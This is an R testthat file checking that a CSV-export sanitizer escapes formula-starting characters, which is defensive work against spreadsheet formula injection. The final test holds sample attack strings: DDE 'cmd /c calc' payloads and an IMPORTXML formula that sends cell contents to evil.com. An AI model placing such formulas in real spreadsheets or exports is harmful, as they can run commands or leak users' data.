# tests/testthat/test-csv-sanitization.R
# Tests for CSV formula injection protection

test_that("CSV sanitization escapes formula characters", {
  malicious_data <- data.frame(
    x = c("=SUM(A1:A10)", "@WEBSERVICE()", "-2+3", "+CALC()", "\tDATA", "\rEXEC"),
    y = c(1, 2, 3, 4, 5, 6),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(malicious_data)

  # All dangerous formula starters should be prefixed with '
  expect_true(grepl("^'=", sanitized$x[1]))
  expect_true(grepl("^'@", sanitized$x[2]))
  expect_true(grepl("^'-", sanitized$x[3]))
  expect_true(grepl("^'\\+", sanitized$x[4]))
  expect_true(grepl("^'\t", sanitized$x[5]))
  expect_true(grepl("^'\r", sanitized$x[6]))
})

test_that("CSV sanitization preserves safe strings", {
  safe_data <- data.frame(
    x = c("Normal text", "123", "Data-2024", "Test_value"),
    y = c(1, 2, 3, 4),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(safe_data)

  # Safe strings should remain unchanged
  expect_equal(sanitized$x, safe_data$x)
})

test_that("CSV sanitization handles NA values", {
  data_with_na <- data.frame(
    x = c("=FORMULA", NA, "safe", NA),
    y = c(1, 2, 3, 4),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(data_with_na)

  # NA values should remain NA
  expect_true(is.na(sanitized$x[2]))
  expect_true(is.na(sanitized$x[4]))

  # Formula should be escaped
  expect_true(grepl("^'=", sanitized$x[1]))

  # Safe value should remain unchanged
  expect_equal(sanitized$x[3], "safe")
})

test_that("CSV sanitization handles empty strings", {
  data_with_empty <- data.frame(
    x = c("=FORMULA", "", "safe"),
    y = c(1, 2, 3),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(data_with_empty)

  # Empty strings should remain empty
  expect_equal(sanitized$x[2], "")

  # Formula should be escaped
  expect_true(grepl("^'=", sanitized$x[1]))
})

test_that("CSV sanitization only affects character columns", {
  mixed_data <- data.frame(
    char_col = c("=FORMULA", "safe"),
    num_col = c(1, 2),
    factor_col = factor(c("A", "B")),
    logical_col = c(TRUE, FALSE),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(mixed_data)

  # Character column should be sanitized
  expect_true(grepl("^'=", sanitized$char_col[1]))

  # Other columns should remain unchanged
  expect_equal(sanitized$num_col, mixed_data$num_col)
  expect_equal(sanitized$factor_col, mixed_data$factor_col)
  expect_equal(sanitized$logical_col, mixed_data$logical_col)
})

test_that("CSV sanitization handles all dangerous characters", {
  # All characters that can start a formula in Excel
  dangerous_chars <- data.frame(
    equals = "=1+1",
    plus = "+1",
    minus = "-1",
    at = "@CELL",
    tab = "\tTAB",
    carriage_return = "\rCR",
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(dangerous_chars)

  # All should be prefixed with '
  expect_true(all(grepl("^'", as.character(sanitized[1, ]))))
})

test_that("CSV sanitization rejects non-dataframe input", {
  expect_error(
    sanitize_csv_output(c("=FORMULA", "safe")),
    "Input skal være en data frame"
  )

  expect_error(
    sanitize_csv_output(list(x = "=FORMULA")),
    "Input skal være en data frame"
  )
})

test_that("CSV sanitization handles real-world malicious payloads", {
  # Real-world CSV injection attacks
  malicious_payloads <- data.frame(
    payload = c(
      "=1+1+cmd|'/c calc'!A1",  # Command execution attempt
      "@SUM(1+1)*cmd|'/c calc'!A1",  # DDE attack
      "+1+1+cmd|'/c calc'!A1",  # Plus variant
      "-1+1+cmd|'/c calc'!A1",  # Minus variant
      "=HYPERLINK(\"http://evil.com\",\"Click me\")",  # Hyperlink injection
      "=IMPORTXML(CONCAT(\"http://evil.com/?\", CONCATENATE(A2:E2)), \"//a\")"  # Data exfiltration
    ),
    description = c(
      "Command execution",
      "DDE attack",
      "Plus variant",
      "Minus variant",
      "Hyperlink injection",
      "Data exfiltration"
    ),
    stringsAsFactors = FALSE
  )

  sanitized <- sanitize_csv_output(malicious_payloads)

  # All payloads should be escaped
  expect_true(all(grepl("^'", sanitized$payload)))

  # Descriptions should remain unchanged (safe)
  expect_equal(sanitized$description, malicious_payloads$description)
})
